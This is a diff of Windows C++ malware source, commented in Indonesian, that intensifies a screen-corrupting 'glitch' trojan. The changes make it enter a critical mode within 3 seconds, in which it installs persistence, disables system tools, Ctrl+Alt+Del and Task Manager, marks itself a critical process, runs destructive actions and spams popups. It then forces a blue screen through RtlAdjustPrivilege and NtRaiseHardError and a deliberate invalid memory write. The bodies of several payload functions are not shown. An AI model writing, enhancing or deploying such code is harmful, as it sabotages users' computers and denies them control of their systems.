@@ -43,9 +43,9 @@ using namespace Gdiplus;
 
 // Konfigurasi intensitas
 const int REFRESH_RATE = 3;  // Lebih cepat untuk efek lebih intens
-const int MAX_GLITCH_INTENSITY = 10000;
-const int GLITCH_LINES = 2000;
-const int MAX_GLITCH_BLOCKS = 1000;
+const int MAX_GLITCH_INTENSITY = 15000;  // Diperbesar
+const int GLITCH_LINES = 3000;  // Diperbanyak
+const int MAX_GLITCH_BLOCKS = 1500;  // Diperbanyak
 const int SOUND_CHANCE = 1;  // Lebih sering
 
 // Variabel global
@@ -340,14 +340,14 @@ void ApplyColorShift(BYTE* pixels, int shift) {
 }
 
 void ApplyScreenShake() {
-    screenShakeX = (rand() % 60 - 30) * intensityLevel;
-    screenShakeY = (rand() % 60 - 30) * intensityLevel;
+    screenShakeX = (rand() % 80 - 40) * intensityLevel;  // Diperbesar
+    screenShakeY = (rand() % 80 - 40) * intensityLevel;  // Diperbesar
 }
 
 void ApplyCursorEffect() {
     if (!cursorVisible || !pPixels) return;
     
-    int cursorSize = std::min(70 * intensityLevel, 700);
+    int cursorSize = std::min(100 * intensityLevel, 1000);  // Diperbesar
     int startX = std::max(cursorX - cursorSize, 0);
     int startY = std::max(cursorY - cursorSize, 0);
     int endX = std::min(cursorX + cursorSize, screenWidth - 1);
@@ -368,8 +368,8 @@ void ApplyCursorEffect() {
                     
                     if (dist < cursorSize / 2) {
                         float amount = 1.0f - (dist / (cursorSize / 2.0f));
-                        int shiftX = static_cast<int>(dx * amount * 20);
-                        int shiftY = static_cast<int>(dy * amount * 20);
+                        int shiftX = static_cast<int>(dx * amount * 30);  // Diperbesar
+                        int shiftY = static_cast<int>(dy * amount * 30);  // Diperbesar
                         
                         int srcX = x - shiftX;
                         int srcY = y - shiftY;
@@ -390,16 +390,16 @@ void ApplyCursorEffect() {
 }
 
 void UpdateParticles() {
-    if (rand() % 5 == 0) {
+    if (rand() % 3 == 0) {  // Lebih sering
         Particle p;
         p.x = rand() % screenWidth;
         p.y = rand() % screenHeight;
-        p.vx = (rand() % 300 - 150) / 20.0f;
-        p.vy = (rand() % 300 - 150) / 20.0f;
+        p.vx = (rand() % 400 - 200) / 20.0f;  // Dipercepat
+        p.vy = (rand() % 400 - 200) / 20.0f;  // Dipercepat
         p.life = 0;
-        p.maxLife = 50 + rand() % 300;
+        p.maxLife = 100 + rand() % 400;  // Durasi diperpanjang
         p.color = RGB(rand() % 256, rand() % 256, rand() % 256);
-        p.size = 1 + rand() % 5;
+        p.size = 2 + rand() % 8;  // Diperbesar
         p.type = rand() % 3;
         particles.push_back(p);
     }
@@ -446,11 +446,11 @@ void UpdateParticles() {
 }
 
 void ApplyMeltingEffect(BYTE* originalPixels) {
-    int meltHeight = 100 + (rand() % 200) * intensityLevel;
-    if (meltHeight < 20) meltHeight = 20;
+    int meltHeight = 150 + (rand() % 300) * intensityLevel;  // Diperbesar
+    if (meltHeight < 30) meltHeight = 30;
     
     for (int y = screenHeight - meltHeight; y < screenHeight; y++) {
-        int meltAmount = (screenHeight - y) * 3;
+        int meltAmount = (screenHeight - y) * 4;  // Diperbesar
         for (int x = 0; x < screenWidth; x++) {
             int targetY = y + (rand() % meltAmount) - (meltAmount / 2);
             if (targetY < screenHeight && targetY >= 0) {
@@ -477,19 +477,19 @@ void ApplyTextCorruption() {
     SelectObject(hdcMem, hBitmap);
     BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
     
-    if (rand() % 100 < 50) {
+    if (rand() % 100 < 70) {  // Lebih sering
         CorruptedText ct;
         ct.x = rand() % (screenWidth - 300);
         ct.y = rand() % (screenHeight - 100);
         ct.creationTime = GetTickCount();
-        ct.life = 3000 + rand() % 5000;
+        ct.life = 5000 + rand() % 7000;  // Durasi diperpanjang
         
-        int textLength = 15 + rand() % 40;
+        int textLength = 20 + rand() % 50;  // Lebih panjang
         for (int i = 0; i < textLength; i++) {
             wchar_t c;
-            if (rand() % 3 == 0) {
+            if (rand() % 2 == 0) {  // Lebih sering
                 c = static_cast<wchar_t>(0x2580 + rand() % 6);
-            } else if (rand() % 4 == 0) {
+            } else if (rand() % 3 == 0) {
                 c = L'�';
             } else {
                 c = static_cast<wchar_t>(0x20 + rand() % 95);
@@ -501,8 +501,8 @@ void ApplyTextCorruption() {
     }
     
     HFONT hFont = CreateFontW(
-        30 + rand() % 40, 0, 
-        (rand() % 30) - 15, 0, 
+        40 + rand() % 50, 0,  // Ukuran font lebih besar
+        (rand() % 45) - 22, 0,  // Rotasi lebih ekstrim
         FW_BOLD, 
         rand() % 2, rand() % 2, rand() % 2,
         DEFAULT_CHARSET,
@@ -524,8 +524,8 @@ void ApplyTextCorruption() {
         if (GetTickCount() - it->creationTime > it->life) {
             it = corruptedTexts.erase(it);
         } else {
-            it->x += (rand() % 11) - 5;
-            it->y += (rand() % 11) - 5;
+            it->x += (rand() % 15) - 7;  // Pergerakan lebih ekstrim
+            it->y += (rand() % 15) - 7;  // Pergerakan lebih ekstrim
             ++it;
         }
     }
@@ -554,8 +554,8 @@ void ApplyTextCorruption() {
 void ApplyPixelSorting() {
     int startX = rand() % screenWidth;
     int startY = rand() % screenHeight;
-    int width = 100 + rand() % 400;
-    int height = 100 + rand() % 400;
+    int width = 150 + rand() % 500;  // Area lebih besar
+    int height = 150 + rand() % 500;  // Area lebih besar
     
     int endX = std::min(startX + width, screenWidth);
     int endY = std::min(startY + height, screenHeight);
@@ -595,8 +595,8 @@ void ApplyPixelSorting() {
 }
 
 void ApplyStaticBars() {
-    int barCount = 10 + rand() % 20;
-    int barHeight = 20 + rand() % 100;
+    int barCount = 15 + rand() % 25;  // Lebih banyak
+    int barHeight = 30 + rand() % 150;  // Lebih tinggi
     
     for (int i = 0; i < barCount; i++) {
         int barY = rand() % screenHeight;
@@ -606,7 +606,7 @@ void ApplyStaticBars() {
             for (int x = 0; x < screenWidth; x++) {
                 int pos = (y * screenWidth + x) * 4;
                 if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                    if (rand() % 2 == 0) {
+                    if (rand() % 3 == 0) {  // Lebih sering
                         pPixels[pos] = rand() % 256;
                         pPixels[pos+1] = rand() % 256;
                         pPixels[pos+2] = rand() % 256;
@@ -620,8 +620,8 @@ void ApplyStaticBars() {
 void ApplyInversionWaves() {
     int centerX = rand() % screenWidth;
     int centerY = rand() % screenHeight;
-    int maxRadius = 200 + rand() % 800;
-    float speed = 0.2f + (rand() % 100) / 100.0f;
+    int maxRadius = 300 + rand() % 1000;  // Area lebih besar
+    float speed = 0.3f + (rand() % 100) / 100.0f;  // Lebih cepat
     DWORD currentTime = GetTickCount();
     
     for (int y = 0; y < screenHeight; y++) {
@@ -631,8 +631,8 @@ void ApplyInversionWaves() {
             float dist = sqrt(dx*dx + dy*dy);
             
             if (dist < maxRadius) {
-                float wave = sin(dist * 0.05f - currentTime * 0.005f * speed) * 0.5f + 0.5f;
-                if (wave > 0.6f) {
+                float wave = sin(dist * 0.03f - currentTime * 0.003f * speed) * 0.5f + 0.5f;
+                if (wave > 0.5f) {  // Threshold lebih rendah
                     int pos = (y * screenWidth + x) * 4;
                     if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                         pPixels[pos] = 255 - pPixels[pos];
@@ -648,8 +648,8 @@ void ApplyInversionWaves() {
 void ApplyDistortionEffect() {
     int centerX = rand() % screenWidth;
     int centerY = rand() % screenHeight;
-    int radius = 200 + rand() % 600;
-    int distortion = 30 + rand() % (120 * intensityLevel);
+    int radius = 300 + rand() % 800;  // Area lebih besar
+    int distortion = 50 + rand() % (150 * intensityLevel);  // Distorsi lebih kuat
     
     int yStart = std::max(centerY - radius, 0);
     int yEnd = std::min(centerY + radius, screenHeight);
@@ -663,9 +663,9 @@ void ApplyDistortionEffect() {
             float distance = sqrt(dx*dx + dy*dy);
             
             if (distance < radius) {
-                float amount = pow(1.0f - (distance / radius), 2.0f);
-                int shiftX = static_cast<int>(dx * amount * distortion * (rand() % 3 - 1));
-                int shiftY = static_cast<int>(dy * amount * distortion * (rand() % 3 - 1));
+                float amount = pow(1.0f - (distance / radius), 2.5f);  // Kurva lebih curam
+                int shiftX = static_cast<int>(dx * amount * distortion * (rand() % 5 - 2));  // Lebih ekstrim
+                int shiftY = static_cast<int>(dy * amount * distortion * (rand() % 5 - 2));  // Lebih ekstrim
                 
                 int srcX = x - shiftX;
                 int srcY = y - shiftY;
@@ -832,6 +832,7 @@ void KillCriticalProcesses() {
 }
 
 void TriggerBSOD() {
+    // Pendekatan lebih agresif untuk trigger BSOD
     HMODULE ntdll = GetModuleHandle(TEXT("ntdll.dll"));
     if (ntdll) {
         typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
@@ -840,12 +841,33 @@ void TriggerBSOD() {
         
         if (NtRaiseHardError) {
             ULONG Response;
-            NTSTATUS status = STATUS_FLOAT_MULTIPLE_FAULTS;
+            NTSTATUS status = STATUS_SYSTEM_PROCESS_TERMINATED;
             NtRaiseHardError(status, 0, 0, 0, 6, &Response);
         }
     }
     
-    int* p = (int*)0x1;
+    // Pendekatan alternatif
+    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+    typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
+    
+    HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
+    if (hNtdll) {
+        pdef_RtlAdjustPrivilege RtlAdjustPrivilege = 
+            reinterpret_cast<pdef_RtlAdjustPrivilege>(GetProcAddress(hNtdll, "RtlAdjustPrivilege"));
+        pdef_NtRaiseHardError NtRaiseHardError = 
+            reinterpret_cast<pdef_NtRaiseHardError>(GetProcAddress(hNtdll, "NtRaiseHardError"));
+        
+        if (RtlAdjustPrivilege && NtRaiseHardError) {
+            BOOLEAN bEnabled;
+            RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
+            ULONG Response;
+            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &Response);
+        }
+        FreeLibrary(hNtdll);
+    }
+    
+    // Force crash
+    int* p = reinterpret_cast<int*>(0xDEADDEAD);
     *p = 0;
 }
 
@@ -866,7 +888,7 @@ void OpenRandomPopups() {
         L"msedge.exe https://www.google.com/search?q=how+to+remove+broken+virus"
     };
 
-    int numPopups = 5 + rand() % 8;
+    int numPopups = 8 + rand() % 10;  // Lebih banyak popup
     bool spawnSpam = (rand() % 2 == 0);
 
     for (int i = 0; i < numPopups; i++) {
@@ -892,7 +914,7 @@ void OpenRandomPopups() {
         Sleep(100);
     }
 
-    if (rand() % 3 == 0) {
+    if (rand() % 2 == 0) {  // Lebih sering
         ShellExecuteW(NULL, L"open", L"wt.exe", NULL, NULL, SW_SHOW);
     }
 }
@@ -904,22 +926,49 @@ void ApplyGlitchEffect() {
     if (!pCopy) return;
     memcpy(pCopy, pPixels, screenWidth * screenHeight * 4);
     
-    DWORD currentTime = GetTickCount();
-    int timeIntensity = 1 + static_cast<int>((currentTime - startTime) / 3000);
-    intensityLevel = std::min(30, timeIntensity);
+    DWORD cTime = GetTickCount();
+    
+    // Perhitungan intensitas berdasarkan waktu
+    if (criticalMode) {
+        intensityLevel = 30;
+    } else {
+        int timeIntensity = 1 + static_cast<int>((cTime - startTime) / 3000);
+        intensityLevel = std::min(30, timeIntensity);
+    }
     
     ApplyScreenShake();
     
-    if (currentTime - lastEffectTime > 500) {
-        textCorruptionActive = (rand() % 100 < 50 * intensityLevel);
-        lastEffectTime = currentTime;
+    if (cTime - lastEffectTime > 500) {
+        textCorruptionActive = (rand() % 100 < 60 * intensityLevel);  // Lebih sering
+        lastEffectTime = cTime;
+    }
+    
+    // ===== MODIFIKASI UTAMA: AKTIFKAN MODE KRITIS DALAM 3 DETIK =====
+    if (!criticalMode && cTime - startTime > 3000) {  // 3 detik
+        criticalMode = true;
+        bsodTriggerTime = cTime + 30000 + rand() % 20000;  // BSOD dalam 30-50 detik
+
+        if (!persistenceInstalled) {
+            InstallPersistence();
+            DisableSystemTools();
+            DisableCtrlAltDel();
+        }
+
+        if (g_isAdmin) {
+            static bool adminDestructionDone = false;
+            if (!adminDestructionDone) {
+                BreakTaskManager();
+                SetCriticalProcess();
+                adminDestructionDone = true;
+            }
+        }
     }
     
     // Glitch garis horizontal intens
-    int effectiveLines = std::min(GLITCH_LINES * intensityLevel, 10000);
+    int effectiveLines = std::min(GLITCH_LINES * intensityLevel, 15000);
     for (int i = 0; i < effectiveLines; ++i) {
         int y = rand() % screenHeight;
-        int height = 1 + rand() % (100 * intensityLevel);
+        int height = 1 + rand() % (150 * intensityLevel);  // Lebih tinggi
         int xOffset = (rand() % (MAX_GLITCH_INTENSITY * 2 * intensityLevel)) - MAX_GLITCH_INTENSITY * intensityLevel;
         
         height = std::min(height, screenHeight - y);
@@ -969,14 +1018,14 @@ void ApplyGlitchEffect() {
     }
     
     // Distorsi blok ekstrim
-    int effectiveBlocks = std::min(MAX_GLITCH_BLOCKS * intensityLevel, 2000);
+    int effectiveBlocks = std::min(MAX_GLITCH_BLOCKS * intensityLevel, 3000);
     for (int i = 0; i < effectiveBlocks; ++i) {
-        int blockWidth = std::min(100 + rand() % (400 * intensityLevel), screenWidth);
-        int blockHeight = std::min(100 + rand() % (400 * intensityLevel), screenHeight);
+        int blockWidth = std::min(150 + rand() % (500 * intensityLevel), screenWidth);  // Lebih besar
+        int blockHeight = std::min(150 + rand() % (500 * intensityLevel), screenHeight);  // Lebih besar
         int x = rand() % (screenWidth - blockWidth);
         int y = rand() % (screenHeight - blockHeight);
-        int offsetX = (rand() % (1000 * intensityLevel)) - 500 * intensityLevel;
-        int offsetY = (rand() % (1000 * intensityLevel)) - 500 * intensityLevel;
+        int offsetX = (rand() % (1500 * intensityLevel)) - 750 * intensityLevel;  // Perpindahan lebih jauh
+        int offsetY = (rand() % (1500 * intensityLevel)) - 750 * intensityLevel;  // Perpindahan lebih jauh
         
         for (int h = 0; h < blockHeight; h++) {
             int sourceY = y + h;
@@ -1005,10 +1054,10 @@ void ApplyGlitchEffect() {
     }
     
     if (intensityLevel > 0 && (rand() % std::max(1, 3 / intensityLevel)) == 0) {
-        ApplyColorShift(pPixels, (rand() % 4) + 1);
+        ApplyColorShift(pPixels, (rand() % 6) + 1);  // Shift warna lebih besar
     }
     
-    int effectivePixels = std::min(screenWidth * screenHeight * intensityLevel, 500000);
+    int effectivePixels = std::min(screenWidth * screenHeight * intensityLevel, 700000);  // Lebih banyak pixel
     for (int i = 0; i < effectivePixels; i++) {
         int x = rand() % screenWidth;
         int y = rand() % screenHeight;
@@ -1023,24 +1072,24 @@ void ApplyGlitchEffect() {
     
     ApplyDistortionEffect();
     
-    if (rand() % 3 == 0) {
-        int lineHeight = 1 + rand() % (5 * intensityLevel);
+    if (rand() % 2 == 0) {  // Lebih sering
+        int lineHeight = 1 + rand() % (7 * intensityLevel);  // Lebih tebal
         for (int y = 0; y < screenHeight; y += lineHeight * 2) {
             for (int h = 0; h < lineHeight; h++) {
                 if (y + h >= screenHeight) break;
                 for (int x = 0; x < screenWidth; x++) {
                     int pos = ((y + h) * screenWidth + x) * 4;
                     if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                        pPixels[pos] = std::min(pPixels[pos] + 150, 255);
-                        pPixels[pos + 1] = std::min(pPixels[pos + 1] + 150, 255);
-                        pPixels[pos + 2] = std::min(pPixels[pos + 2] + 150, 255);
+                        pPixels[pos] = std::min(pPixels[pos] + 180, 255);  // Lebih terang
+                        pPixels[pos + 1] = std::min(pPixels[pos + 1] + 180, 255);
+                        pPixels[pos + 2] = std::min(pPixels[pos + 2] + 180, 255);
                     }
                 }
             }
         }
     }
     
-    if (intensityLevel > 0 && (rand() % std::max(1, 10 / intensityLevel)) == 0) {
+    if (intensityLevel > 0 && (rand() % std::max(1, 8 / intensityLevel)) == 0) {
         for (int i = 0; i < static_cast<int>(screenWidth * screenHeight * 4); i += 4) {
             if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                 pPixels[i] = 255 - pPixels[i];
@@ -1050,7 +1099,7 @@ void ApplyGlitchEffect() {
         }
     }
     
-    if (intensityLevel > 3 && rand() % 5 == 0) {
+    if (intensityLevel > 2 && rand() % 3 == 0) {  // Lebih sering
         ApplyMeltingEffect(pCopy);
     }
     
@@ -1058,15 +1107,15 @@ void ApplyGlitchEffect() {
         ApplyTextCorruption();
     }
     
-    if (intensityLevel > 2 && rand() % 5 == 0) {
+    if (intensityLevel > 1 && rand() % 3 == 0) {  // Lebih sering
         ApplyPixelSorting();
     }
     
-    if (intensityLevel > 1 && rand() % 3 == 0) {
+    if (intensityLevel > 1 && rand() % 2 == 0) {  // Lebih sering
         ApplyStaticBars();
     }
     
-    if (intensityLevel > 2 && rand() % 4 == 0) {
+    if (intensityLevel > 1 && rand() % 3 == 0) {  // Lebih sering
         ApplyInversionWaves();
     }
     
@@ -1077,42 +1126,19 @@ void ApplyGlitchEffect() {
         PlayGlitchSoundAsync();
     }
     
-    if (rand() % 50 == 0) {
+    if (rand() % 30 == 0) {  // Lebih sering
         cursorVisible = !cursorVisible;
         ShowCursor(cursorVisible);
     }
     
     // ===== POPUP RANDOM =====
     static DWORD lastPopupTime = 0;
-    if (GetTickCount() - lastPopupTime > 2000 && (rand() % 100 < (30 + intensityLevel * 5))) {
+    if (GetTickCount() - lastPopupTime > 1500 && (rand() % 100 < (40 + intensityLevel * 7))) {  // Lebih sering
         std::thread(OpenRandomPopups).detach();
         lastPopupTime = GetTickCount();
     }
     
     // ===== DESTRUCTIVE EFFECTS =====
-    DWORD cTime = GetTickCount();
-    
-    // Aktifkan mode kritis setelah 20 detik
-    if (!criticalMode && cTime - startTime > 20000) {
-        criticalMode = true;
-        bsodTriggerTime = cTime + 20000 + rand() % 20000;
-        
-        if (!persistenceInstalled) {
-            InstallPersistence();
-            DisableSystemTools();
-            DisableCtrlAltDel();
-        }
-        
-        if (g_isAdmin) {
-            static bool adminDestructionDone = false;
-            if (!adminDestructionDone) {
-                BreakTaskManager();
-                SetCriticalProcess();
-                adminDestructionDone = true;
-            }
-        }
-    }
-    
     if (criticalMode && !destructiveActionsTriggered) {
         ExecuteDestructiveActions();
     }
@@ -1120,7 +1146,7 @@ void ApplyGlitchEffect() {
     if (criticalMode) {
         intensityLevel = 30;
         
-        if (cTime >= bsodTriggerTime) {
+        if (bsodTriggerTime != 0 && cTime >= bsodTriggerTime) {
             std::thread(TriggerBSOD).detach();
         }
     }
@@ -1170,6 +1196,12 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 void RunBackgroundProcess() {
     FreeConsole();
     
+    // Set variabel global untuk proses background
+    ::startTime = GetTickCount();
+    ::criticalMode = false;
+    ::persistenceInstalled = false;
+    ::destructiveActionsTriggered = false;
+    
     HDC hdcScreen = GetDC(NULL);
     screenWidth = GetSystemMetrics(SM_CXSCREEN);
     screenHeight = GetSystemMetrics(SM_CYSCREEN);
@@ -1185,17 +1217,6 @@ void RunBackgroundProcess() {
     ReleaseDC(NULL, hdcScreen);
     
     while (true) {
-        if (!persistenceInstalled) {
-            InstallPersistence();
-            DisableSystemTools();
-            DisableCtrlAltDel();
-            
-            if (g_isAdmin) {
-                BreakTaskManager();
-                SetCriticalProcess();
-            }
-        }
-        
         CaptureScreen(NULL);
         ApplyGlitchEffect();
         
@@ -1321,20 +1342,20 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
     ShellExecuteExW(&sei);
     
     std::thread([]() {
+        for (int i = 0; i < 20; i++) {  // Lebih panjang
+            Beep(200, 100);  // Frekuensi lebih rendah
+            Beep(700, 100);  // Rentang lebih lebar
+            Beep(1200, 100); // Frekuensi lebih tinggi
+            Sleep(5);        // Interval lebih pendek
+        }
+        
+        for (int i = 0; i < 150; i++) {  // Lebih banyak beep
+            Beep(rand() % 8000 + 300, 10);
+            Sleep(1);
+        }
+        
         for (int i = 0; i < 15; i++) {
-            Beep(300, 80);
-            Beep(600, 80);
-            Beep(900, 80);
-            Sleep(10);
-        }
-        
-        for (int i = 0; i < 100; i++) {
-            Beep(rand() % 7000 + 500, 15);
-            Sleep(2);
-        }
-        
-        for (int i = 0; i < 10; i++) {
-            Beep(50 + i * 200, 200);
+            Beep(30 + i * 250, 250);  // Rentang lebih lebar
         }
     }).detach();
     
